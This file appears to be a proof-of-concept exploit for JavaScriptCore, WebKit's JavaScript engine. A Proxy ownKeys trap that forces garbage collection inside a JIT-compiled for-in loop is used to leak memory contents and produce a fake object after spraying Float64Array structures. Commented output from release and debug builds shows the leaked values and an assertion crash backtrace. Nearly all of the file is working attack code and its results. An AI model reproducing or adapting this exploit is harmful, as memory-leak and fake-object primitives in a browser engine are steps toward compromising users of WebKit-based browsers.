var o;
var o2, o3;

function obj_with_size(n){

    let s = 'var obj = {';
    for (let y = 0; y < n; y++){
        s += 'a' + y + ':' + '"a"' + ',';
    }
    s += '}'
    eval(s);
    return obj;
    
}

function obj_with_ab(n){

    let s = 'var obj = {';
    for (let y = 0; y < n; y++){
        s += 'a' + y + ':' + 'new ArrayBuffer(0x80)' + ',';
    }
    s += '}'
    eval(s);
    return obj;
    
}


o2 = obj_with_size(46800)
o3 = obj_with_size(46800)
o = obj_with_ab(4);

function opt(tmp,flag) {
            
    function f(a) {
        if (flag){
            gc();
        }
        return a;
    }
        
    let p = new Proxy(tmp,{ownKeys:f});
    o2.__proto__ = p;

    for (let x in o2) {
    
        if (flag) { 
            // we don't want to refarance this
            // object twice if its a fake_object.
            // because jsc would crash..
            // so save this into a string.
            let s = typeof x;
                        
            if ( s == 'object' ){
                return x;
            } else {
                if ( typeof x == 'string' ){}
                else {
                  print('typeof x:' + typeof x);
                  print('leaked memory: '+ x);
                }
            }
        } else { 
          // optimize access ..
          x = 'AAAAAAAA';        
        }
    }
    
}


// Compile the functions
for (let t = 0; t <200;t++){
    opt(o3,false);
}

var s = [];

function sprayStructures() {
  for (let i = 0; i < 0x10000; i++) {
      let a = new Float64Array(1);
      a['a0'] = 3.54484805889626e-310;
      s.push(a);
  }
}

sprayStructures();   
    
let fake_object = opt(o,true);
print(typeof fake_object);
print('success');

// would crash ..
print(describe(fake_object));


// do not gc s.. so deref it..
for ( let tt = 0 ; tt < s.length; tt ++ ){s[tt];}


/*

when you run the release build you should see:

lucy:bin akayn$ ./jsc ~/poc.js
typeof x:number
leaked memory: 4.628987547775967e-299
typeof x:number
leaked memory: 9.719576448981733e+204
object
success
INVALID
lucy:bin akayn$
and in the debug build:

lucy:bin akayn$ ./jsc ~/poc.js
typeof x:number
leaked memory: 4.6289875477759656e-299
typeof x:number
leaked memory: 7.186796064232505e-68
typeof x:number
leaked memory: -0.0000017285360272012563
object
success
INVALID
ASSERTION FAILED: value.isUndefinedOrNull()
.../ntrunk/Source/JavaScriptCore/bytecode/SpeculatedType.cpp(526) : JSC::SpeculatedType                  JSC::speculationFromValue(JSC::JSValue)
1   0x1091a3b79 WTFCrash
2   0x1041b1a80 WTF::BasicRawSentinelNode<Worker>::remove()
3   0x1058464d4 JSC::speculationFromValue(JSC::JSValue)
4   0x1056b7039 JSC::ValueProfileBase<1u>::computeUpdatedPrediction(JSC::ConcurrentJSLocker const&)
5   0x10572b8b5 JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11::operator()(JSC::ValueProfile&) const
6   0x10572f117 auto void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)::'lambda15'(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&)::operator()<JSC::OpCall::Metadata>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&) const
7   0x10572c3b9 void JSC::MetadataTable::forEach<JSC::OpCall, void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)::'lambda15'(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&)>(void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)::'lambda15'(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&) const&)
8   0x1056aedca void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)
9   0x1056ade5b JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)
10  0x1056af5cc JSC::CodeBlock::updateAllValueProfilePredictions()
11  0x107c4ba71 JSC::LLInt::jitCompileAndSetHeuristics(JSC::CodeBlock*, JSC::ExecState*, unsigned int)
12  0x107c4b189 llint_loop_osr
13  0x107c42436 llint_entry
14  0x107c2f352 vmEntryToJavaScript
15  0x1078c3014 JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*)
16  0x1078c0d8f JSC::Interpreter::executeProgram(JSC::SourceCode const&, JSC::ExecState*, JSC::JSObject*)
17  0x1081e26e7 JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&)
18  0x10427d2dd runWithOptions(GlobalObject*, CommandLine&, bool&)
19  0x10420db14 jscmain(int, char**)::$_4::operator()(JSC::VM&, GlobalObject*, bool&) const
20  0x1041b6847 int runJSC<jscmain(int, char**)::$_4>(CommandLine const&, bool, jscmain(int, char**)::$_4 const&)
21  0x1041b334c jscmain(int, char**)
22  0x1041b310e main
23  0x7fff599ba3d5 start
24  0x2
Illegal instruction: 4
lucy:bin akayn$ 

*/



